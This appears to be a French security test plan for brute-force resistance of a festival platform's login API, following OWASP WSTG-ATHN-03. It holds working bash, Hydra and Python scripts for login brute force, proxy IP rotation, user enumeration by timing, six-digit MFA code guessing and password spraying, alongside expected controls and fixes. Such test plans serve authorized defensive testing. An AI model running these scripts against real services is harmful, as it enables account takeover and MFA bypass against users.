# Tests de Brute Force

## Objectif

Verifier la resistance de l'application aux attaques par force brute sur les mecanismes d'authentification.

## Reference

- **OWASP ID**: WSTG-ATHN-03
- **CWE**: CWE-307 (Improper Restriction of Excessive Authentication Attempts)

---

## Test Cases

### BF-001: Brute Force Login Basique

**Objectif**: Tester le rate limiting sur le endpoint de login

**Pre-requis**:
- Compte utilisateur valide
- Liste de mots de passe communs

**Procedure**:
1. Envoyer 10 requetes de login avec mauvais mot de passe
2. Observer la reponse apres chaque tentative
3. Continuer jusqu'a 50 tentatives
4. Verifier si un blocage se produit

**Requete**:
```http
POST /api/v1/auth/login HTTP/1.1
Host: api.festival-platform.com
Content-Type: application/json

{
  "email": "user@test.local",
  "password": "wrongpassword123"
}
```

**Script de test**:
```bash
#!/bin/bash
TARGET="https://api.staging.festival-platform.com"
EMAIL="user@test.local"

for i in {1..50}; do
    response=$(curl -s -w "\n%{http_code}" -X POST "$TARGET/api/v1/auth/login" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$EMAIL\",\"password\":\"wrong$i\"}")

    http_code=$(echo "$response" | tail -1)
    body=$(echo "$response" | head -n -1)

    echo "Attempt $i: HTTP $http_code"

    if [ "$http_code" == "429" ]; then
        echo "Rate limit detected at attempt $i"
        break
    fi
done
```

**Resultat Attendu**:
- Rate limiting actif apres 5-10 tentatives
- Code HTTP 429 (Too Many Requests)
- Header `Retry-After` present
- Message d'erreur non verbose

**Resultat Vulnerable**:
- Aucun rate limiting
- Possibilite de continuer indefiniment
- Messages d'erreur revelant si l'email existe

**Severite**: HAUTE

---

### BF-002: Brute Force avec Rotation d'IP

**Objectif**: Tester si le rate limiting est base uniquement sur l'IP

**Procedure**:
1. Effectuer 10 tentatives depuis IP1
2. Changer d'IP (proxy/VPN)
3. Effectuer 10 nouvelles tentatives
4. Verifier si le compteur est reset

**Script avec proxies**:
```bash
#!/bin/bash
PROXIES=(
    "proxy1.example.com:8080"
    "proxy2.example.com:8080"
    "proxy3.example.com:8080"
)

for proxy in "${PROXIES[@]}"; do
    for i in {1..10}; do
        curl -s -x "$proxy" -X POST "$TARGET/api/v1/auth/login" \
            -H "Content-Type: application/json" \
            -d '{"email":"user@test.local","password":"wrong"}'
    done
    echo "Completed 10 attempts via $proxy"
done
```

**Resultat Attendu**:
- Rate limiting base sur le compte, pas seulement l'IP
- Blocage du compte apres X tentatives totales

---

### BF-003: Enumeration d'Utilisateurs via Login

**Objectif**: Determiner si les messages d'erreur revelent l'existence des comptes

**Procedure**:
1. Tenter login avec email valide + mauvais mot de passe
2. Tenter login avec email invalide
3. Comparer les reponses (message, timing, headers)

**Requetes**:
```http
# Email valide
POST /api/v1/auth/login
{"email": "existing@test.local", "password": "wrong"}

# Email invalide
POST /api/v1/auth/login
{"email": "nonexistent@test.local", "password": "wrong"}
```

**Analyse du timing**:
```bash
# Mesurer le temps de reponse
for email in "existing@test.local" "nonexistent@test.local"; do
    time=$(curl -s -o /dev/null -w "%{time_total}" -X POST "$TARGET/api/v1/auth/login" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$email\",\"password\":\"wrong\"}")
    echo "$email: ${time}s"
done
```

**Resultat Attendu**:
- Message identique: "Invalid credentials"
- Temps de reponse similaire (< 100ms de difference)
- Pas de difference dans les headers

**Resultat Vulnerable**:
```json
// Email valide
{"error": "Invalid password"}

// Email invalide
{"error": "User not found"}
```

**Severite**: MOYENNE

---

### BF-004: Brute Force MFA/OTP

**Objectif**: Tester le rate limiting sur les codes MFA

**Procedure**:
1. S'authentifier avec credentials valides
2. Recevoir la demande de MFA
3. Tenter des codes aleatoires

**Script**:
```bash
#!/bin/bash
SESSION_TOKEN="<token_from_login>"

for code in {000000..000100}; do
    response=$(curl -s -X POST "$TARGET/api/v1/auth/verify-mfa" \
        -H "Authorization: Bearer $SESSION_TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"code\":\"$code\"}")

    if echo "$response" | grep -q "success"; then
        echo "Valid code found: $code"
        break
    fi
done
```

**Resultat Attendu**:
- Maximum 3-5 tentatives avant blocage
- Invalidation du token de session apres echecs
- Delai exponentiel entre tentatives

---

### BF-005: Password Spraying

**Objectif**: Tester plusieurs comptes avec un mot de passe commun

**Procedure**:
1. Collecter une liste d'emails valides
2. Tester un mot de passe commun sur tous les comptes
3. Attendre et repeter avec un autre mot de passe

**Script**:
```bash
#!/bin/bash
PASSWORDS=("Password123!" "Festival2024!" "Welcome1!" "Admin123!")
EMAILS=("user1@test.local" "user2@test.local" "admin@test.local")

for password in "${PASSWORDS[@]}"; do
    echo "Testing password: $password"
    for email in "${EMAILS[@]}"; do
        response=$(curl -s -X POST "$TARGET/api/v1/auth/login" \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"$email\",\"password\":\"$password\"}")

        if echo "$response" | grep -q "token"; then
            echo "SUCCESS: $email:$password"
        fi
        sleep 1  # Eviter rate limiting
    done
    sleep 60  # Delai entre passwords
done
```

**Resultat Attendu**:
- Detection des patterns de password spraying
- Alerte de securite declenchee
- Politique de mot de passe forte empechant les passwords communs

---

## Outils Recommandes

### Hydra
```bash
hydra -L emails.txt -P passwords.txt \
    festival-platform.com https-post-form \
    "/api/v1/auth/login:email=^USER^&password=^PASS^:Invalid credentials"
```

### Burp Suite Intruder
1. Capturer la requete de login
2. Envoyer a Intruder
3. Configurer les positions sur email/password
4. Utiliser Cluster Bomb pour tester toutes les combinaisons

### Custom Script Python
```python
import requests
import time
from concurrent.futures import ThreadPoolExecutor

def attempt_login(email, password):
    response = requests.post(
        "https://api.staging.festival-platform.com/api/v1/auth/login",
        json={"email": email, "password": password}
    )
    return response.status_code, response.json()

emails = ["user1@test.local", "user2@test.local"]
passwords = ["password1", "password2", "password3"]

for password in passwords:
    with ThreadPoolExecutor(max_workers=5) as executor:
        results = executor.map(
            lambda e: attempt_login(e, password),
            emails
        )
    time.sleep(60)  # Respect rate limits
```

---

## Controles de Securite Attendus

| Controle | Implementation Recommandee |
|----------|---------------------------|
| Rate Limiting | Max 5 tentatives/5 min par compte |
| Account Lockout | Blocage 15 min apres 10 echecs |
| CAPTCHA | Apres 3 tentatives echouees |
| Alerting | Notification apres 5 echecs |
| Logging | Enregistrer toutes les tentatives |
| Generic Messages | "Invalid credentials" uniquement |

---

## Vulnerabilites Exemple

### Exemple 1: Absence de Rate Limiting

**Constat**: Le endpoint `/api/v1/auth/login` ne limite pas le nombre de tentatives.

**Impact**: Un attaquant peut effectuer des milliers de tentatives par minute.

**PoC**:
```bash
# 1000 tentatives en moins de 5 minutes
for i in {1..1000}; do
    curl -s -X POST "$TARGET/api/v1/auth/login" \
        -d '{"email":"admin@test.local","password":"attempt'$i'"}'
done
```

**CVSS**: 7.5 (High)
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
```

**Remediation**: Voir [../remediation/auth-fix.md](../remediation/auth-fix.md)

### Exemple 2: Enumeration via Timing

**Constat**: Le temps de reponse differe selon l'existence du compte.
- Email existant: ~250ms (verification du hash)
- Email inexistant: ~50ms (pas de verification)

**Impact**: Possibilite d'enumerer les comptes valides.

**Remediation**: Toujours effectuer une comparaison de hash, meme pour les comptes inexistants.
